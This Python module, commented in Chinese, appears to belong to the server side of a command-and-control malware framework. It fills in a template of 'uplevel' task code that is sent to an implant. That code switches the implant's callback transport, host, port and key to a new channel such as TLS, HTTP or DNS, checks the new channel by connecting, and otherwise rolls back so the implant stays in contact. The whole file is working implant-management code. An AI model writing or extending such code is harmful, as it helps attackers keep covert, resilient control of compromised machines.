"""
server/s_modules/transport_base.py — 传输生成器公共逻辑（T7.1/U2）

_T 契约（6.3/6.12）:
  零参数函数，返回已连接的 socket（默认 TcpXor 实现内联在 implant 模板）。
  帧收发 p()/q() 与消息语义不变，只换传输。

两阶段升级模板（U4）:
  1. 临时切换 _T/_H/_P/_K 为新通道参数
  2. 探测：_T() 建立连接即视为新通道可用（TLS 握手/HTTP 响应/DNS 应答
     均为连接建立的一部分——传输层探测，不发业务帧，proxy 无需特殊支持）
  3. 成功 → 提交；失败 → 恢复旧参数并回传错误（无失联窗口）
"""

UPGRADE_TEMPLATE = '''\
# --- uplevel: {protocol} {host}:{port} ---
{transport_code}

def _up():
    global _T, _H, _P, _K
    oT, oH, oP, oK = _T, _H, _P, _K
    try:
        _T = _nT
        _H = {host!r}
        _P = {port}
        _K = bytes.fromhex({key_hex!r})
        t = _T()          # 探测：新通道可建立连接即成功
        t.close()
        return "uplevel ok: {protocol} {host}:{port}"
    except Exception as e:
        _T, _H, _P, _K = oT, oH, oP, oK   # 回退旧通道
        return "uplevel failed (rolled back): " + str(e)

print(_up())
'''


def build_upgrade_task(protocol: str, host: str, port: int,
                       key_hex: str, transport_code: str) -> str:
    """组装两阶段升级任务代码（由 uplevel 命令下发）。"""
    return UPGRADE_TEMPLATE.format(
        protocol=protocol, host=host, port=int(port),
        key_hex=key_hex, transport_code=transport_code,
    )
